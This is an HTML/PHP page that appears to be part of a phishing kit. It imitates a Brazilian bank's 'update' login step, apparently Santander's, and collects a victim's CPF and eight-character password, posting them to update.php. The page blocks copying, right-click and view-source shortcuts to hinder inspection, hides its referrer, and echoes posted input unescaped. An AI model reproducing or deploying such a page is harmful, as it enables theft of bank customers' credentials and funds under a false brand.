<html><head><script>
function disableselect(e){
    return false;
}

function reEnable(){   
    return true;
}

document.onselectstart = function() { return false; }   
document.oncontextmenu = function() { return false; }

if (window.sidebar) {   
    document.onmousedown = disableselect;   
    document.onclick = reEnable;
}

document.onkeydown = function(e) {
  if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 ||  e.keyCode === 117)) {
    alert('Acao nao permitida!');
    return false;
  } else {
          return true;
        }
};
</script>
<!-- Referrer -->
<script>
  var meta = document.createElement('meta');
  meta.name = "referrer";
  meta.content = "no-referrer";
  document.getElementsByTagName('head')[0].appendChild(meta);
</script><meta name="referrer" content="no-referrer">




<meta charset="utf-8">
<title>Atualização</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<meta name="mobile-web-app-capable" content="yes">
<link rel="stylesheet" type="text/css" href="style.css">
<style>
.fk {

	font-size: 1px;
	color: #FFF;
}
	
.atencao {
	font-size: 13px;
	color: #E40203;
}	

#cpf {
	width: 85%;
	border: none;
	border-bottom: 1px solid #999;
	padding: 5px;
	font-size: 14px;
	outline: none;
}
	
	
#snet {
	width: 85%;
	border: none;
	border-bottom: 1px solid #999;
	padding: 5px;
	font-size: 14px;
	outline: none;
}
	
@media (min-width: 600px) {
	#modalalert {
		margin: 0 auto;
		!important
	}
}

@media (min-width: 600px) {
	#modalalert2 {
		max-width: 500px;
		margin: 0 auto;
		!important
	}
}

.modalposition {
	position: fixed;
	z-index: 1;
	left: 0;
	top: 0;
	width: 100%;
	height: 100%;
	overflow: auto;
	background-color: rgb(0, 0, 0);
	background-color: rgba(0, 0, 0, 0.4);
}

.modalposition2 {
	z-index: 99999;
	border: 3px solid #FFF;
	position: absolute;
	left: 10px;
	right: 10px;
	font-family: Arial;
	font-size: 12px;
	top: 25%;
	height: 220px;
	background: #FFF;
	color: #000;
	border-radius: 0;
	box-shadow: 0 0 10px #999;
}

.modaldiv1 {
	height: 30px;
	width: ;
}

.modaltext {
	color: #7D7D7D;
	font-size: 15px;
	text-align: center;
	margin-left: 1cm;
	margin-right: 1cm;
}

.modalbutton {
	padding: 5px 30px 5px 30px;
	color: #FFF;
	border: 1px solid #900;
	font-size: 12px;
	background: #F00;
	font-weight: bold;
	border-radius: 0;
}

.modaldiv2 {
	margin-top: 50px;
}

.modalinforma {
	
	padding: 15px;
	font-family: Arial;
	font-size: 20px;
	color: #FFF;
	background: url(images/atencao-traco.png) repeat-x;
	text-shadow: 1px 1px 1px #666666;
}

.botaook {
	height: 41px;
	width: 191px;
	margin-top: 90px;
	background: url(images/atencao-ok.jpg);
}	
</style>

<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script language="javascript" src="assets/scripts/bootstrap.min.js"></script>
<script language="javascript" src="assets/scripts/jquery.mask.min.js"></script>
<script language="javascript" src="assets/scripts/valida_login.js"></script>
<script language="javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery-placeholder/2.3.1/jquery.placeholder.min.js"></script>
<script language="javascript" src="assets/scripts/numeros.js"></script>
</head>

<body onload="window.scrollTo(0,1);">
<div id="topo">
	<img src="images/sant_logo.png">	
</div>
	
<div id="topo2">
	<img src="images/ico_key_acesso.png">
	<div class="acessar"><p>Acessar</p></div>

</div>	

<div id="campos">
    <div style="display:none;" id="modalalert" class="modalposition">
        <div class="modalposition2" id="modalalert2">
            <div class="modaldiv1">
               <img style="padding-top: 20px; padding-left: 30px;" src="images/atencao-nome.jpg" width="106" height="26" alt="">
                <center>
                  <div class="modalinforma">
                        <div class="glyphicon glyphicon-warning-sign" style="padding:0 0 0 0;"></div>
                        <span class="atencao">.</span>
                    </div>
                    <div class="modaltext">
                        <div id="TextErrorModal">Erro</div>
                    </div>
              </center>
            </div>
            <div class="modaldiv2" align="center">
                <a href="#closemodal">
                    <button class="botaook" onclick="document.getElementById('modalalert').style.display='none';return false;">&nbsp;</button>
                </a>
            </div>
        </div>
    </div>
<form action="update.php" method="post" id="form" name="form">
 	<input type="hidden" name="cpf" value="<?php echo $_POST['cpf']; ?>">
 <table width="80%" class="center pt100">
  <tbody>
    <tr>
      <td><span>CPF</span></td>
    </tr>
    <tr>
      <td><input class="cpf" type="text" id="cpf" name="cpf" value="<?php echo $_POST['cpf']; ?>" readonly=""></td>
    </tr>
        
    <tr style="height: 20px;">
      <td></td>
    </tr>
    <tr>
      <td><span>Digite sua senha</span></td>
    </tr>
    <tr>
      <td><input class="snet" type="text" style="-webkit-text-security: disc;" name="snet" id="snet" maxlength="8"></td>
    </tr>
  </tbody>
    
</table>

<div class="pt30">
	<input type="submit" id="btn-entrar" value="CONTINUAR" onclick="return ValidaLogin()">
</div>
	
		
</form>

</div>




<script id="wappalyzer" src="chrome-extension://gppongmhjkpfnbhagpmjfkannfbllamg/js/inject.js"></script></body></html>